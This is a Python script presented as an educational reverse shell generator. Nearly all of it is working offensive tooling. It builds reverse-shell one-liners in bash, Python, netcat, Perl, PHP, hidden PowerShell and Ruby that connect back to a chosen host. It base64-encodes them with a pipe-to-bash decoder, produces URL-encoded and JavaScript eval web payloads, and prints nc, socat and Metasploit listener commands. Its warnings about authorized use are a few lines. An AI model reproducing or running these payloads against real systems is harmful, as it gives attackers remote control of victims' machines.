#!/usr/bin/env python3
"""
Reverse Shell Generator - Educational payload creation tool

This tool demonstrates how reverse shells work and generates various types
for educational and authorized testing purposes.

WARNING: Only use on systems you own or have explicit permission to test.

Usage: python reverse_shell_generator.py <lhost> <lport> [shell_type]
"""

import base64
import sys
import urllib.parse

class ReverseShellGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        
    def generate_bash_shell(self):
        """
        Generate bash reverse shell
        
        How it works:
        - Uses /dev/tcp for network connection (bash built-in)
        - Redirects stdin/stdout/stderr to network socket
        - Creates interactive shell over network
        """
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        
        return {
            'name': 'Bash Reverse Shell',
            'payload': payload,
            'description': 'Uses bash built-in networking features',
            'requirements': 'bash with /dev/tcp support',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_python_shell(self):
        """
        Generate Python reverse shell
        
        How it works:
        - Creates socket connection to attacker
        - Duplicates file descriptors for stdin/stdout/stderr
        - Spawns bash subprocess with redirected I/O
        """
        payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        
        return {
            'name': 'Python Reverse Shell',
            'payload': payload,
            'description': 'Cross-platform, works with Python 2/3',
            'requirements': 'python interpreter',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_netcat_shell(self):
        """
        Generate netcat reverse shell
        
        How it works:
        - Uses netcat (nc) to create network connection
        - -e flag executes shell and pipes I/O through connection
        """
        payload = f"nc -e /bin/bash {self.lhost} {self.lport}"
        
        return {
            'name': 'Netcat Reverse Shell',
            'payload': payload,
            'description': 'Simple and effective if nc available',
            'requirements': 'netcat with -e support',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_perl_shell(self):
        """
        Generate Perl reverse shell
        
        How it works:
        - Uses Perl socket functions
        - Forks process and redirects I/O
        - Executes shell with network connection
        """
        payload = f"""perl -e 'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};'"""
        
        return {
            'name': 'Perl Reverse Shell',
            'payload': payload,
            'description': 'Works on most systems with Perl',
            'requirements': 'perl interpreter',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_php_shell(self):
        """
        Generate PHP reverse shell
        
        How it works:
        - Uses PHP socket functions
        - Creates file stream from socket
        - Executes commands and returns output
        """
        payload = f"""php -r '$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/bash -i <&3 >&3 2>&3");'"""
        
        return {
            'name': 'PHP Reverse Shell',
            'payload': payload,
            'description': 'Useful for web application exploitation',
            'requirements': 'php interpreter',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_powershell_shell(self):
        """
        Generate PowerShell reverse shell (Windows)
        
        How it works:
        - Uses .NET socket classes
        - Creates network stream
        - Executes cmd.exe with network I/O
        """
        payload = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {{$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}}"""""
        
        return {
            'name': 'PowerShell Reverse Shell',
            'payload': payload,
            'description': 'Windows PowerShell reverse shell',
            'requirements': 'PowerShell (Windows)',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_ruby_shell(self):
        """
        Generate Ruby reverse shell
        """
        payload = f"""ruby -rsocket -e'f=TCPSocket.open("{self.lhost}",{self.lport}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'"""
        
        return {
            'name': 'Ruby Reverse Shell',
            'payload': payload,
            'description': 'Ruby-based reverse shell',
            'requirements': 'ruby interpreter',
            'encoded': base64.b64encode(payload.encode()).decode()
        }
    
    def generate_web_payloads(self):
        """
        Generate web-friendly payloads (URL encoded, etc.)
        """
        bash_shell = self.generate_bash_shell()
        
        payloads = {
            'url_encoded': urllib.parse.quote(bash_shell['payload']),
            'double_url_encoded': urllib.parse.quote(urllib.parse.quote(bash_shell['payload'])),
            'html_encoded': bash_shell['payload'].replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;'),
            'javascript': f"javascript:eval(String.fromCharCode({','.join(str(ord(c)) for c in bash_shell['payload'])}))"
        }
        
        return payloads
    
    def generate_listener_commands(self):
        """
        Generate listener commands for the attacker machine
        """
        listeners = {
            'netcat': f"nc -nvlp {self.lport}",
            'netcat_verbose': f"nc -nvlp {self.lport} -s {self.lhost}",
            'socat': f"socat file:`tty`,raw,echo=0 tcp-listen:{self.lport}",
            'python_listener': f"""python -c "import socket;s=socket.socket();s.bind(('{self.lhost}',{self.lport}));s.listen(1);c,a=s.accept();print('Connected:',a);[print(c.recv(1024).decode(),end='') for _ in iter(int,1)]"
""",
            'metasploit': f"""
use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST {self.lhost}
set LPORT {self.lport}
exploit
"""
        }
        
        return listeners
    
    def print_shell(self, shell_data):
        """
        Print shell information in formatted way
        """
        print(f"\n=== {shell_data['name']} ===")
        print(f"Description: {shell_data['description']}")
        print(f"Requirements: {shell_data['requirements']}")
        print(f"\nPayload:")
        print(shell_data['payload'])
        print(f"\nBase64 Encoded:")
        print(shell_data['encoded'])
        print(f"\nDecoding command:")
        print(f"echo {shell_data['encoded']} | base64 -d | bash")
        print("-" * 60)
    
    def generate_all_shells(self):
        """
        Generate all available shell types
        """
        shells = [
            self.generate_bash_shell(),
            self.generate_python_shell(),
            self.generate_netcat_shell(),
            self.generate_perl_shell(),
            self.generate_php_shell(),
            self.generate_powershell_shell(),
            self.generate_ruby_shell()
        ]
        
        return shells

def print_usage():
    """Print usage information"""
    print("Usage: python reverse_shell_generator.py <lhost> <lport> [shell_type]")
    print("\nAvailable shell types:")
    print("  bash, python, netcat, perl, php, powershell, ruby, all")
    print("\nExamples:")
    print("  python reverse_shell_generator.py 10.10.10.10 4444 bash")
    print("  python reverse_shell_generator.py 192.168.1.100 1337 all")

def main():
    """Main function"""
    if len(sys.argv) < 3:
        print_usage()
        sys.exit(1)
    
    lhost = sys.argv[1]
    
    try:
        lport = int(sys.argv[2])
        if not (1 <= lport <= 65535):
            raise ValueError("Port out of range")
    except ValueError:
        print("[!] Port must be a number between 1 and 65535")
        sys.exit(1)
    
    shell_type = sys.argv[3].lower() if len(sys.argv) > 3 else 'bash'
    
    # Ethical warning
    print("=" * 70)
    print("EDUCATIONAL REVERSE SHELL GENERATOR")
    print("=" * 70)
    print("WARNING: Only use on systems you own or have permission to test!")
    print("Unauthorized use may be illegal in your jurisdiction.")
    print("=" * 70)
    
    generator = ReverseShellGenerator(lhost, lport)
    
    if shell_type == 'all':
        print(f"\nGenerating all reverse shell types for {lhost}:{lport}")
        
        shells = generator.generate_all_shells()
        for shell in shells:
            generator.print_shell(shell)
        
        # Print listener commands
        print("\n=== LISTENER COMMANDS ===")
        listeners = generator.generate_listener_commands()
        for name, command in listeners.items():
            print(f"\n{name.upper()}:")
            print(command)
        
        # Print web payloads
        print("\n=== WEB PAYLOADS ===")
        web_payloads = generator.generate_web_payloads()
        for encoding, payload in web_payloads.items():
            print(f"\n{encoding.upper()}:")
            print(payload[:100] + "..." if len(payload) > 100 else payload)
    
    else:
        # Generate specific shell type
        shell_methods = {
            'bash': generator.generate_bash_shell,
            'python': generator.generate_python_shell,
            'netcat': generator.generate_netcat_shell,
            'perl': generator.generate_perl_shell,
            'php': generator.generate_php_shell,
            'powershell': generator.generate_powershell_shell,
            'ruby': generator.generate_ruby_shell
        }
        
        if shell_type in shell_methods:
            shell = shell_methods[shell_type]()
            generator.print_shell(shell)
            
            print("\n=== LISTENER COMMAND ===")
            print(f"nc -nvlp {lport}")
        else:
            print(f"[!] Unknown shell type: {shell_type}")
            print_usage()
            sys.exit(1)

if __name__ == "__main__":
    main()